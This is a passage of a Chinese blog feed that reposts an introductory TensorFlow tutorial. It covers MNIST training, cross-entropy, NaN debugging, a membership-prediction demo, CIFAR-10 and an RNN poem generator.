损失函数和优化设置</h3><p>为了训练我们的模型，我们首先需要定义一个指标来衡量这个模型是好还是坏。这个指标称为成本（cost）或损失（loss），然后尽量最小化这个指标。简单的说，就是我们需要最小化loss的值，loss的值越小，则我们的模型越逼近标签的真实结果。</p><p>Demo中使用的损失函数是“交叉熵”（cross-entropy），它的公式如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835393807_3301_1487835388666.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>y 是我们预测的概率分布, y’ 是实际的分布（我们输入的)，交叉熵是用来衡量我们的预测结果的不准确性。TensorFlow拥有一张描述各个计算单元的图，也就是整个模型的计算流程，它可以自动地使用反向传播算法(backpropagation algorithm)，来确定我们的权重等变量是如何影响我们想要最小化的那个loss值的。然后，TensorFlow会用我们设定好的优化算法来不断修改变量以降低loss值。</p><p>其中，demo采用梯度下降算法（gradient descent algorithm）以0.01的学习速率最小化交叉熵。梯度下降算法是一个简单的学习过程，TensorFlow只需将每个变量一点点地往使loss值不断降低的方向更新。</p><p>对应的关键代码如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835412631_4507_1487835407643.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>备注内容：</p><ul><li><a href="http://colah.github.io/posts/2015-09-Visual-Information/" target="_blank" rel="noopener">交叉熵</a></li><li><a href="http://colah.github.io/posts/2015-08-Backprop/" target="_blank" rel="noopener">反向传播</a></li></ul><p>在代码中会看见one-hot vector的概念和变量名，其实这个是个非常简单的东西，就是设置一个10个元素的数组，其中只有一个是1，其他都是0，以此表示数字的标签结果。<br>例如表示数字3的标签值：<br>[0,0,0,1,0,0,0,0,0,0]</p><h3 id="4-训练运算和模型准确度测试"><a href="#4-训练运算和模型准确度测试" class="headerlink" title="4. 训练运算和模型准确度测试"></a>4. 训练运算和模型准确度测试</h3><p>通过前面的实现，我们已经设置好了整个模型的计算“流程图”，它们都成为TensorFlow框架的一部分。于是，我们就可以启动我们的训练程序，下面的代码的含义是，循环训练我们的模型500次，每次批量取50个训练样本。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835430926_4789_1487835425964.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>其训练过程，其实就是TensorFlow框架的启动训练过程，在这个过程中，python批量地将数据交给底层库进行处理。<br>我在官方的demo里追加了两行代码，每隔50次则额外计算一次当前模型的识别准确率。它并非必要的代码，仅仅用于方便观察整个模型的识别准确率逐步变化的过程。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835491726_6639_1487835486623.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>当然，里面涉及的accuracy（预测准确率）等变量，需要在前面的地方定义占位：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835504713_4066_1487835499596.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>当我们训练完毕，则到了验证我们的模型准确率的时候，和前面相同：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835519432_6550_1487835514510.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>我的demo跑出来的结果如下（softmax回归的例子运行速度还是比较快的），当前的准确率是0.9252：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835591993_6315_1487835586980.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="5-实时查看参数的数值的方法"><a href="#5-实时查看参数的数值的方法" class="headerlink" title="5. 实时查看参数的数值的方法"></a>5. 实时查看参数的数值的方法</h3><p>刚开始跑官方的demo的时候，我们总想将相关变量的值打印出来看看，是怎样一种格式和状态。从demo的代码中，我们可以看见很多的Tensor变量对象，而实际上这些变量对象都是无法直接输出查看，粗略地理解，有些只是占位符，直接输出的话，会获得类似如下的一个对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tensor(&quot;Equal:0&quot;, shape=(?,), dtype=bool)</span><br></pre></td></tr></table></figure><p>既然它是占位符，那么我们就必须喂一些数据给它，它才能将真实内容展示出来。因此，正确的方法是，在打印时通常需要加上当前的输入数据给它。</p><p>例如，查看y的概率数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(sess.run(y, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;))</span><br></pre></td></tr></table></figure><p>部分非占位符的变量还可以这样输出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(W.eval())</span><br></pre></td></tr></table></figure><p>总的来说，92%的识别准确率是比较令人失望，因此，官方的MNIST其实也有多种模型的不同版本，其中比较适合图片处理的CNN(卷积神经网络)的版本，可以获得99%以上的准确率，当然，它的执行耗时也是比较长的。</p><p>（备注：cnn_mnist.py就是卷积神经网络版本的，后面有附带微云网盘的下载url）</p><p>前馈神经网络（feed-forward neural network）版本的MNIST，可达到97%：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835615972_112_1487835611123.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>分享在微云上的数据和源码：<a href="http://url.cn/44aZOpP" target="_blank" rel="noopener">http://url.cn/44aZOpP</a></p><p>（备注：国外网站下载都比较慢，我这份下载相对会快一些，在环境已经搭建完毕的情况下，执行里面的run.py即可）</p><h2 id="五、和业务场景结合的demo：预测用户是否是超级会员身份"><a href="#五、和业务场景结合的demo：预测用户是否是超级会员身份" class="headerlink" title="五、和业务场景结合的demo：预测用户是否是超级会员身份"></a>五、和业务场景结合的demo：预测用户是否是超级会员身份</h2><p>根据前面的内容，我们对上述基于softmax只是三层（输入、处理、输出）的神经网络模型已经比较熟悉，那么，这个模型是否可以应用到我们具体的业务场景中，其中的难度大吗？为了验证这一点，我拿了一些现网的数据来做了这个试验。</p><p><strong>1. 数据准备</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835640707_9298_1487835636110.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>我将一个现网的电影票活动的用户参与数据，包括点击过哪些按钮、手机平台、IP地址、参与时间等信息抓取了出来。其实这些数据当中是隐含了用户的身份信息的，例如，某些礼包的必须是超级会员身份才能领取，如果这个按钮用户点击领取成功，则可以证明该用户的身份肯定是超级会员身份。当然，我只是将这些不知道相不相关的数据特征直观的整理出来，作为我们的样本数据，然后对应的标签为超级会员身份。</p><p>用于训练的样本数据格式如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835656634_9699_1487835651861.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>第一列是QQ号码，只做认知标识的，第二列表示是否超级会员身份，作为训练的标签值，后面的就是IP地址，平台标志位以及参与活动的参与记录（0是未成功参与，1表示成功参与）。则获得一个拥有11个特征的数组（经过一些转化和映射，将特别大的数变小）：</p><p>[0.9166666666666666, 0.4392156862745098, 0.984313725490196, 0.7411764705882353, 0.2196078431372549, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0]</p><p>对应的是否是超级数据格式如下，作为监督学习的标签：</p><p>超级会员：[0, 1]<br>非超级会员：[1, 0]</p><p>这里需要专门解释下，在实际应用中需要做数据转换的原因。一方面，将这些数据做一个映射转化，有助于简化数据模型。另一方面，是为了规避NaN的问题，当数值过大，在一些数学指数和除法的浮点数运算中，有可能得到一个无穷大的数值，或者其他溢出的情形，在Python里会变为NaN类型，这个类型会破坏掉后续全部计算结果，导致计算异常。<br>例如下图，就是特征数值过大，在训练过程中，导致中间某些参数累计越来越大，最终导致产生NaN值，后续的计算结果全部被破坏掉：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835674331_1358_1487835670178.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>而导致NaN的原因在复杂的数学计算里，会产生无穷大或者无穷小。例如，在我们的这个demo中，产生NaN的原因，主要是因为softmax的计算导致。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835692586_8707_1487835687457.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>RuntimeWarning: divide by zero encountered in log</p><p>刚开始做实际的业务应用，就发现经常跑出极奇怪异的结果（遇到NaN问题，我发现程序也能继续走下去），几经排查才发现是NAN值问题，是非常令人沮丧的。当然，经过仔细分析问题，发现也并非没有排查的方式。因为，NaN值是个奇特的类型，可以采用下述编码方式NaN != NaN来检测自己的训练过程中，是否出现的NaN。</p><p>关键程序代码如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835727418_3743_1487835722627.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>我采用上述方法，非常顺利地找到自己的深度学习程序，在学习到哪一批数据时产生的NaN。因此，很多原始数据我们都会做一个除以某个值，让数值变小的操作。例如官方的MNIST也是这样做的，将256的像素颜色的数值统一除以255，让它们都变成一个小于1的浮点数。</p><p>MNIST在处理原始图片像素特征数据时，也对特征数据进行了变小处理：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835744753_6167_1487835739920.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>NaN值问题一度深深地困扰着我（往事不堪回首-__-!!），特别放到这里，避免入门的同学踩坑。</p><p><strong>2. 执行结果</strong></p><p>我准备的训练集（6700）和测试集（1000）数据并不多，不过，超级会员身份的预测准确率最终可以达到87%。虽然，预测准确率是不高，这个可能和我的训练集数据比较少有关系，不过，整个模型也没有花费多少时间，从整理数据、编码、训练到最终跑出结果，只用了2个晚上的时间。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835762329_1207_1487835757307.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>下图是两个实际的测试例子，例如，该模型预测第一个QQ用户有82%的概率是非超级会员用户，17.9%的概率为超级会员用户（该预测是准确的）。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835777596_428_1487835772680.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>通过上面的这个例子，我们会发觉其实对于某些比较简单的场景下应用，我们是可以比较容易就实现的。</p><h2 id="六、其他模型"><a href="#六、其他模型" class="headerlink" title="六、其他模型"></a>六、其他模型</h2><p><strong>1. CIFAR-10识别图片分类的demo（官方）</strong></p><p>CIFAR-10数据集的分类是机器学习中一个公开的基准测试问题，它任务是对一组32x32RGB的图像进行分类，这些图像涵盖了10个类别：飞机， 汽车， 鸟， 猫， 鹿， 狗， 青蛙， 马， 船和卡车。</p><p>这也是官方的重要demo之一。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835795488_7154_1487835791177.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>更详细的介绍内容：</p><ul><li><a href="http://www.cs.toronto.edu/~kriz/cifar.html" target="_blank" rel="noopener">The CIFAR-10 dataset</a></li><li><a href="http://tensorfly.cn/tfdoc/tutorials/deep_cnn.html" target="_blank" rel="noopener">卷积神经网络</a></li></ul><p>该例子执行的过程比较长，需要耐心等待。</p><p>我在机器上的执行过程和结果：</p><p>cifar10_train.py用于训练：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835815550_5647_1487835810904.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>cifar10_eval.py用于检验结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835831631_9118_1487835826763.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>识别率不高是因为该官方模型的识别率本来就不高：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835846097_1207_1487835841481.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>另外，官方的例子我首次在1月5日跑的时候，还是有一些小问题的，无法跑起来（最新的官方可能已经修正），建议可以直接使用我放到微云上的版本（代码里面的log和读取文件的路径，需要调整一下）。</p><p>源码下载：<a href="http://url.cn/44mRzBh" target="_blank" rel="noopener">http://url.cn/44mRzBh</a></p><p>微云盘里，不含训练集和测试集的图片数据，但是，程序如果检测到这些图片不存在，会自行下载：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835865727_7977_1487835861204.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p><strong>2. 是否大于5岁的测试demo</strong></p><p>为了检验softma回归模型是否能够学习到一些我自己设定好的规则，我做了一个小demo来测试。我通过随机数生成的方式构造了一系列的数据，让前面的softmax回归模型去学习，最终看看模型能否通过训练集的学习，最终100%预测这个样本数据是否大于5岁。</p><p>模型和数据本身都比较简单，构造的数据的方式：</p><p>我随机构造一个只有2个特征纬度的样本数据，[year, 1]，其中year随机取值0-10，数字1是放进去作为干扰。</p><p>如果year大于5岁，则标签设置为：[0, 0, 1]；</p><p>否则，标签设置为：[0, 1, 0]。</p><p>生成了6000条假训练集去训练该模型，最终它能做到100%成功预测准确：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835914467_1332_1487835909518.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>微云下载（源码下载）：<a href="http://url.cn/44mKFNK" target="_blank" rel="noopener">http://url.cn/44mKFNK</a></p><p><strong>3. 基于RNN的古诗学习</strong></p><p>最开头的AI写古诗，非常令人感到惊艳，那个demo是美国的一个研究者做出来的，能够根据主题生成不能的古诗，而且古诗的质量还比较高。于是，我也尝试在自己的机器上也跑一个能够写古诗的模型，后来我找到的是一个基于RNN的模型。RNN循环神经网络(Recurrent Neural Networks)，是非常常用的深度学习模型之一。我基于一个外部的demo，进行一些调整后跑起一个能够学习古诗和写古诗的比较简单的程序。</p><p>执行写诗（让它写了十首）：</p><ol><li>抑滴留居潋罅斜，二川还羡五侯家。古刘称士身相染，桃李栽林欲称家。回首二毛相喘日，万当仙性尽甘无。如何羽马嘶来泪，不信红峰一寸西。</li><li>废寺松阴月似空，垂杨风起晚光催。乌心不把嫌香径，出定沧洲几好清。兰逐白头邻斧蝶，苍苍归路自清埃。渔樵若欲斜阳羡，桂苑西河碧朔来。</li><li>遥天花落甚巫山，凤珮飞驰不骋庄。翠初才象饮毫势，上月朱炉一重牛。香催戍渚同虚客，石势填楼取蕊红。佳句旧清箱畔意，剪颜相激菊花繁。</li><li>江上萧条第一取，名长经起月还游。数尺温皋云战远，放船乡鬼蘸云多。相逢槛上西风动，莫听风烟认钓鱼。堤费禽雏应昨梦，去朝从此满玄尘。</li><li>避命抛醺背暮时，见川谁哭梦知年。却随筵里腥消极，不遇嘉唐两带春。大岁秘魔窥石税，鹤成应听白云中。朝浮到岸鸱巇恨，不向青青听径长。</li><li>楚田馀绝宇氤氲，细雨洲头万里凉。百叶长看如不尽，水东春夜足残峰。湖头风浪斜暾鼓，北阙别罹初里村。山在四天三顾客，辘轳争养抵丹墀。</li><li>九日重门携手时，吟疑须渴辞金香。钓来犹绕结茶酒，衣上敬亭宁强烧。自明不肯疑恩日，琴馆寒霖急暮霜。划口濡于孤姹末，出谢空卿寄银机。莲龛不足厌丝屦，华骑敷砧出钓矶。</li><li>为到席中逢旧木，容华道路不能休。时闲客后多时石，暗水天边暖人说。风弄霜花嗥明镜，犀成磨逐乍牵肠。何劳相听真行侍，石石班场古政蹄。</li><li>听巾邑外见朱兰，杂时临厢北满香。门外玉坛花府古，香牌风出即升登。陵桥翠黛销仙妙，晓接红楼叠影闻。敢把苦谣金字表，应从科剑独频行。</li><li>昨日荣枯桃李庆，紫骝坚黠自何侵。险知河在皆降月，汉县烟波白发来。仍省封身明月阁，不知吹水洽谁非。更拟惭送风痕去，只怕鲸雏是后仙。</li></ol><p>另外，我抽取其中一些个人认为写得比较好的诗句（以前跑出来的，不在上图中）：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835938029_9943_1487835933180.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>该模型比较简单，写诗的水平不如最前面我介绍的美国研究者demo，但是，所采用的基本方法应该是类似的，只是他做的更为复杂。</p><p>另外，这是一个通用模型，可以学习不同的内容（古诗、现代诗、宋词或者英文诗等），就可以生成对应的结果。</p><h2 id="七、深度学习的入门学习体会"><a href="#七、深度学习的入门学习体会" class="headerlink" title="七、深度学习的入门学习体会"></a>七、深度学习的入门学习体会</h2><ol><li>人工智能和深度学习技术并不神秘，更像是一个新型的工具，通过喂数据给它，然后，它能发现这些数据背后的规律，并为我们所用。</li><li>数学基础比较重要，这样有助于理解模型背后的数学原理，不过，从纯应用角度来说，并不一定需要完全掌握数学，也可以提前开始做一些尝试和学习。</li><li>我深深地感到计算资源非常缺乏，每次调整程序的参数或训练数据后，跑完一次训练集经常要很多个小时，部分场景不跑多一些训练集数据，看不出差别，例如写诗的案例。个人感觉，这个是制约AI发展的重要问题，它直接让程序的“调试”效率非常低下。</li><li>中文文档比较少，英文文档也不多，开源社区一直在快速更新，文档的内容过时也比较快。因此，入门学习时遇到的问题会比较多，并且缺乏成型的文档。</li></ol><h2 id="八、小结"><a href="#八、小结" class="headerlink" title="八、小结"></a>八、小结</h2><p>我不知道人工智能的时代是否真的会来临，也不知道它将要走向何方，但是，毫无疑问，它是一种全新的技术思维模式。更好的探索和学习这种新技术，然后在业务应用场景寻求结合点，最终达到帮助我们的业务获得更好的成果，一直以来，就是我们工程师的核心宗旨。另一方面，对发展有重大推动作用的新技术，通常会快速的发展并且走向普及，就如同我们的编程一样，因此，人人都可以做深度学习应用，并非只是一句噱头。</p><p><strong>参考文档：</strong></p><p><a href="http://www.tensorfly.cn/" target="_blank" rel="noopener">TensorFlow中文社区</a><br><a href="https://www.tensorflow.org/" target="_blank" rel="noopener">TensorFlow英文社区</a></p><p><strong>数学相关的内容：</strong></p><p><a href="http://url.cn/44r6LAQ" target="_blank" rel="noopener">高中和大学数学部分内容</a><br><a href="http://open.163.com/special/opencourse/daishu.html" target="_blank" rel="noopener">线性代数视频</a></p><blockquote><p>转载自小时光茶社</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;经典入门demo：识别手写数字（MNIST）&quot;&gt;&lt;a href=&quot;#经典入门demo：识别手写数字（MNIST）&quot; class=&quot;headerlink&quot; title=&quot;经典入门demo：识别手写数字（MNIST）&quot;&gt;&lt;/a&gt;经典入门demo：识别手写数字（MNIST）&lt;/h2&gt;&lt;p&gt;常规的编程入门有“Hello world”程序，而深度学习的入门程序则是MNIST，一个识别28×28像素的图片中的手写数字的程序。&lt;/p&gt;
&lt;p&gt;备注：&lt;a href=&quot;http://yann.lecun.com/exdb/mnist/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MNIST 的数据和官网&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;深度学习的内容，其背后会涉及比较多的数学原理，作为一个初学者，受限于我个人的数学和技术水平，也许并不足以准确讲述相关的数学原理，因此，本文会更多的关注“应用层面”，不对背后的数学原理进行展开，感谢谅解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ai" scheme="http://www.twosee.cn/tags/ai/"/>
    
  </entry>
  
  <entry>
    <title>[转] 人人都可以做深度学习应用 入门篇</title>
    <link href="http://www.twosee.cn/2018/01/04/AI-everyone/"/>
    <id>http://www.twosee.cn/2018/01/04/AI-everyone/</id>
    <published>2018-01-03T21:38:41.000Z</published>
    <updated>2018-05-12T03:19:13.477Z</updated>
    
    <content type="html"><![CDATA[<p>2017年围棋界发生了一件比较重要事，Master（Alphago）以60连胜横扫天下，击败各路世界冠军，人工智能以气势如虹的姿态出现在我们人类的面前。围棋曾经一度被称为“人类智慧的堡垒”，如今，这座堡垒也随之成为过去。从2016年三月份AlphaGo击败李世石开始，AI全面进入我们大众的视野，对于它的讨论变得更为火热起来，整个业界普遍认为，它很可能带来下一次科技革命，并且，在未来可预见的10多年里，深刻地改变我们的生活。</p><a id="more"></a><p>其实，AI除了可以做我们熟知的人脸、语音等识别之外，它可以做蛮多有趣的事情。</p><p>例如，让AI学习大量古诗之后写古诗，并且可以写出质量非常不错的古诗。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487834861894_8010_1487834857060.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>又或者，将两部设计造型不同的汽车进行融合，形成全新一种设计风格的新汽车造型。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487834872575_2690_1487834867777.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>还有，之前大家在朋友圈里可能看过的，将相片转换成对应的艺术风格的画作。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487834879897_8519_1487834875505.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>当前，人工智能已经在图像、语音等多个领域的技术上，取得了全面的突破。与此同时，另外一个问题随之而来，如果这一轮的AI浪潮真的将会掀起新的科技革命，那么在可预见的未来，我们整个互联网都将发生翻天覆地的变化，深刻影响我们的生活。那么作为普通业务开发工程师的我，又应该以何种态度和方式应对这场时代洪流的冲击呢？</p><p>在回答这个问题之前，我们先一起看看上一轮由计算机信息技术引领的科技革命中，过去30多年中国程序员的角色变化：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487834896098_7431_1487834891171.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>通过上图可以简总结：编程技术在不断地发展并且走向普及，从最开始掌握在科学家和专家学者手中的技能，逐渐发展为一门大众技能。换而言之，我们公司内很多资深的工程师，如果带着今天对编程和计算机的理解和理念回到1980年，那么他无疑就是那个时代的计算机专家。</p><p>如果这一轮AI浪潮真的会带来新的一轮科技革命，那么我们相信，它也会遵循类似的发展轨迹，逐步发展和走向普及。如果基于这个理解，或许，我们可以通过积极学习，争取成为第一代AI工程师。</p><h2 id="二、深度学习技术"><a href="#二、深度学习技术" class="headerlink" title="二、深度学习技术"></a>二、深度学习技术</h2><p>这一轮AI的技术突破，主要源于深度学习技术，而关于AI和深度学习的发展历史我们这里不重复讲述，可自行查阅。我用了一个多月的业务时间，去了解和学习了深度学习技术，在这里，我尝试以一名业务开发工程师的视角，以尽量容易让大家理解的方式一起探讨下深度学习的原理，尽管，受限于我个人的技术水平和掌握程度，未必完全准确。</p><h3 id="1-人的智能和神经元"><a href="#1-人的智能和神经元" class="headerlink" title="1. 人的智能和神经元"></a>1. 人的智能和神经元</h3><p>人类智能最重要的部分是大脑，大脑虽然复杂，它的组成单元却是相对简单的，大脑皮层以及整个神经系统，是由神经元细胞组成的。而一个神经元细胞，由树突和轴突组成，它们分别代表输入和输出。连在细胞膜上的分叉结构叫树突，是输入，那根长长的“尾巴”叫轴突，是输出。神经元输出的有电信号和化学信号，最主要的是沿着轴突细胞膜表面传播的一个电脉冲。忽略掉各种细节，神经元，就是一个积累了足够的输入，就产生一次输出（兴奋）的相对简单的装置。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487834910348_1293_1487834905492.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>树突和轴突都有大量的分支，轴突的末端通常连接到其他细胞的树突上，连接点上是一个叫“突触”的结构。一个神经元的输出通过突触传递给成千上万个下游的神经元，神经元可以调整突触的结合强度，并且，有的突触是促进下游细胞的兴奋，有的是则是抑制。一个神经元有成千上万个上游神经元，积累它们的输入，产生输出。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487834927553_2814_1487834922786.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>人脑有1000亿个神经元，1000万亿个突触，它们组成人脑中庞大的神经网络，最终产生的结果即是人的智能。</p><h3 id="2-人工神经元和神经网络"><a href="#2-人工神经元和神经网络" class="headerlink" title="2. 人工神经元和神经网络"></a>2. 人工神经元和神经网络</h3><p>一个神经元的结构相对来说是比较简单的，于是，科学家们就思考，我们的AI是否可以从中获得借鉴？神经元接受激励，输出一个响应的方式，同计算机中的输入输出非常类似，看起来简直就是量身定做的，刚好可以用一个函数来模拟。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487834991434_745_1487834986421.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>通过借鉴和参考神经元的机制，科学家们模拟出了人工神经元和人工神经网络。当然，通过上述这个抽象的描述和图，比较难让大家理解它的机制和原理。我们以“房屋价格测算”作为例子，一起来看看：</p><p>一套房子的价格，会受到很多因素的影响，例如地段、朝向、房龄、面积、银行利率等等，这些因素如果细分，可能会有几十个。一般在深度学习模型里，这些影响结果的因素我们称之为特征。我们先假设一种极端的场景，例如影响价格的特征只有一种，就是房子面积。于是我们收集一批相关的数据，例如，50平米50万、93平米95万等一系列样本数据，如果将这些样本数据放到而为坐标里看，则如下图：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835009033_4366_1487835004171.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>然后，正如我们前面所说的，我们尝试用一个“函数”去拟合这个输入（面积x）和输出（价格y），简而言之，我们就是要通过一条直线或者曲线将这些点“拟合”起来。</p><p>假设情况也比较极端，这些点刚好可以用一条“直线”拟合（真实情况通常不会是直线），如下图：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835032138_9123_1487835027439.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>那么我们的函数是一个一次元方程f(x) = ax +b，当然，如果是曲线的话，我们得到的将是多次元方程。我们获得这个f(x) = ax +b的函数之后，接下来就可以做房价“预测”，例如，我们可以计算一个我们从未看见的面积案例81.5平方米，它究竟是多少钱？</p><p>这个新的样本案例，可以通过直线找到对应的点（黄色的点），如图下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835046807_828_1487835042188.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>粗略的理解，上面就是AI的概括性的运作方式。这一切似乎显得过于简单了？当然不会，因为，我们前面提到，影响房价其实远不止一个特征，而是有几十个，这样问题就比较复杂了，接下来，这里则要继续介绍深度学习模型的训练方式。这部分内容相对复杂一点，我尽量以业务工程师的视角来做一个粗略而简单的阐述。</p><h3 id="3-深度学习模型的训练方式"><a href="#3-深度学习模型的训练方式" class="headerlink" title="3. 深度学习模型的训练方式"></a>3. 深度学习模型的训练方式</h3><p>当有好几十个特征共同影响价格的时候，自然就会涉及权重分配的问题，例如有一些对房价是主要正权重的，例如地段、面积等，也有一些是负权重的，例如房龄等。</p><p>（1）初始化权重计算</p><p>那么，第一个步其实是给这些特征加一个权重值，但是，最开始我们根本不知道这些权重值是多少？怎么办呢？不管那么多了，先给它们随机赋值吧。随机赋值，最终计算出来的估算房价肯定是不准确的，例如，它可能将价值100万的房子，计算成了10万。</p><p>（2）损失函数</p><p>因为现在模型的估值和实际估值差距比较大，于是，我们需要引入一个评估“不准确”程度的衡量角色，也就是损失（loss）函数，它是衡量模型估算值和真实值差距的标准，损失函数越小，则模型的估算值和真实值的察觉越小，而我们的根本目的，就是降低这个损失函数。让刚刚的房子特征的模型估算值，逼近100万的估算结果。</p><p>（3）模型调整</p><p>通过梯度下降和反向传播，计算出朝着降低损失函数的方向调整权重参数。举一个不恰当的比喻，我们给面积增加一些权重，然后给房子朝向减少一些权重（实际计算方式，并非针对单个个例特征的调整），然后损失函数就变小了。</p><p>（4）循环迭代</p><p>调整了模型的权重之后，就可以又重新取一批新的样本数据，重复前面的步骤，经过几十万次甚至更多的训练次数，最终估算模型的估算值逼近了真实值结果，这个模型的则是我们要的“函数”。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835065513_3162_1487835060855.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>为了让大家更容易理解和直观，采用的例子比较粗略，并且讲述深度学习模型的训练过程，中间省略了比较多的细节。讲完了原理，那么我们就开始讲讲如何学习和搭建demo。</p><h3 id="三、深度学习环境搭建"><a 